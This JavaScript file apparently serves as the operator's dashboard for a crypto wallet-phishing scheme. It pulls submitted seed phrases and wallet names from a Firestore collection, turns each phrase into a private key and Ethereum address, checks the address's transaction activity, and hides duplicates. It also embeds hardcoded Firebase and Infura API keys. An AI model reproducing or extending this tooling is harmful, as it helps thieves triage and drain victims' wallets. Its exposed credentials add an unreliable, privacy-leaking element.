// Define the Ethereum address you want to check
const web3 = new Web3('https://mainnet.infura.io/v3/be7908329a7b4b48bd2bcaed67c632dd');

// var url = 'https://pamalikasako-default-rtdb.firebaseio.com/database.json'

// function testAjax() {
//     var result="";
//     $.ajax({
//       url: url,
//       async: false,  
//       success:function(data) {
//          result = data.config; 
//       }
//    });
//    return result;
// }

// const config = testAjax()

const config = {
  apiKey: "AIzaSyD69bgj4MFshniXYfkXyaNVQZirGCXLTVA",
  authDomain: "krkrkrkr-ebbd1.firebaseapp.com",
  projectId: "krkrkrkr-ebbd1",
  storageBucket: "krkrkrkr-ebbd1.appspot.com",
  messagingSenderId: "49644818512",
  appId: "1:49644818512:web:6da9f88eab7e8013f28155"
}
console.log(config)

const db = firebase.firestore(firebase.initializeApp(config))

 function fire() {
    db.collection("datas").orderBy('time', 'desc')
    .onSnapshot(async (snapshot) => {

  
        tosta(`DELETE OLD ENTRIES MAX IS 5 <br> <small style="color:#4ec9b0">`)
      

        snapshot.docChanges().forEach( (change) => {
            let d = change.doc.data();
            let i = change.doc.id
            let t = d.time.toDate().toLocaleString()
            let w = d.wallet
  

            if (d.phrase.length > 41 && d.status !== 'hide') {
                data(i, d.phrase, t, w)
            } else {

            }
            
        });
        
    $('.new').find('.entries').each( function () {
        let b = $(this)
        
        $(b).on('click', function() {

            $('#public').html('')
            $('#count').html('')
            $('#showvalue').html(`${$(this).attr('title')}`)
        })



        
    })
    await DDelte()
    await removeDOM()
    });



}

fire()


function data(id, key, time, wallet) {
  const format = `
  <div class="entry">
  <span id="${id}" class="badge bg-danger delete">x</span>
  <button id="${id}" type="button" class="btn btn-sm btn-light position-relative entries" title="${key}">${key}</button>

  <span class="badge badge-pill badge-primary">${time}</span>
  <span id="${wallet}" class="badge bg-information">${wallet}</span>
  </div>
  `;

  $('.new').append(format)
}



//delete new

async function DDelte() {
  var dd = $('.delete')


  dd.each( function () {

    var i = $(this).attr('id')


    $(this).on('click', () => {

      var tttt = $(this).next('.entries').attr('title')
      $(this).parent().remove()
        
        db.collection("datas").doc(i).update({
            status: 'hide'
         }).then( function ()  {
          tosta(`${tttt}`)
          
         })



    })


  })


}




//DUPLICATED ELEMENT

async function removeDU() {
      const xx = $('.entry').find('.entries')

  var found = {}
      xx.each( async function () {
        
        const dddd = $(this).attr('title')
        const idd = $(this).attr('id')


        if ( found[dddd]) {


          setTimeout( async () => {
            await DELFIRE(`${idd}`)
            $(this).parent().remove()
          }, 5000);
          // $(this).parent().remove()
          
    
            // await DELFIRE(`${dupARR}`)
           

     

        } else {
          found[dddd] = true;

          

          // console.log(idd)
          
        }

      })
     
}

//JUST ON DOM
async function removeDOM() {
  const xx = $('.entry').find('.entries')

var found = {}
  xx.each( async function () {
    
    const dddd = $(this).attr('title')
    const idd = $(this).attr('id')


    if ( found[dddd]) {


      setTimeout( async () => {
        $(this).parent().remove()
      }, 5000);

       

 

    } else {
      found[dddd] = true;

      

      // console.log(idd)
      
    }

  })
 
}

//deleting duplicated elements in firebase

async function DELFIRE(t) {

    db.collection("datas").doc(t).update({
      status: 'hide'
   }).then( function ()  {
    tosta(`duplicated ID: ${t}`)
   })

}


//DELAY
setTimeout( function() {
   removeDU()
}, 5000)












$('#copy').on('click', () => {
  var k = $('#showvalue').html()
  navigator.clipboard.writeText(`${k}`)
  toastr.success(`COPIED<br><br>${k}`)
})

$('#check').on('click', () => {

  var k = $('#showvalue').html()

  getK(k)


})



$('#transaction').on('click', () => {

  var k = $('#public').html()
  console.log(k)
  checkT(k)

})



$('#1').each( function () {

  $(this).prepend(pkey.substring(0, 9) + '...')

  $(this).attr('title', pkey)

  $(this).on('click', () => {
    $('#public').html('')
    $('#count').html('')
    $('#showvalue').html(`${pkey}`)



  })

})












function checkT(address) {

  web3.eth.getTransactionCount(address)
    .then(count => {
      console.log(`Transaction count for address ${address}: ${count}`);
      $('#count').html(`${count}`)
    })
    .catch(error => {
      console.error('Error occurred:', error);
    });
}






function getK(address) {

  try {



    const y = web3.eth.accounts.privateKeyToAccount(address)


    var isP = web3.utils.isHex(address)


    if (isP == true) {
      $('#public').html(y.address)
      console.log(y.address);

      
    } else {


    }

   

  } catch (error) {

    console.log(error)

    let mnemonicWallet = ethers.Wallet.fromMnemonic(address);
    const mnemonicPrivate = mnemonicWallet.privateKey
    // console.log(mnemonicPrivate);
    const y = web3.eth.accounts.privateKeyToAccount(mnemonicPrivate)
    console.log(y.address)
    $('#public').html(y.address)
  }



}




function MNEMONIC(address) {

  let mnemonicWallet = ethers.Wallet.fromMnemonic(address);
  const mnemonicPrivate = mnemonicWallet.privateKey
  // console.log(mnemonicPrivate);
  const y = web3.eth.accounts.privateKeyToAccount(mnemonicPrivate)
  console.log(y.address)

}


toastr.options = {
  "closeButton": true,
  "debug": false,
  "newestOnTop": true,
  "progressBar": false,
  "positionClass": "toast-top-right",
  "preventDuplicates": true,
  "onclick": null,
  "showDuration": "30000000",
  "hideDuration": "100000",
  "timeOut": 0,
  "extendedTimeOut": 0,
  "showEasing": "swing",
  "hideEasing": "linear",
  "showMethod": "fadeIn",
  "hideMethod": "fadeOut",
  "tapToDismiss": false
}


async function tosta(txt) {


  toastr.error(`DELETING <BR><BR>${txt} <BR><BR> <button class="clear">clear all</button>`)

  $('.clear').on('click', function (){
    toastr.remove()
  })

}


function secure() {
  history.pushState({pageID: 'dog'}, 'About', '/lksakldjakld90128301283j;laskl;ad;slkdasd');

  var g = localStorage.getItem('gogongkwarta')

  if (!g) {
    location.reload()
  }

}


console.log('updated, 03')


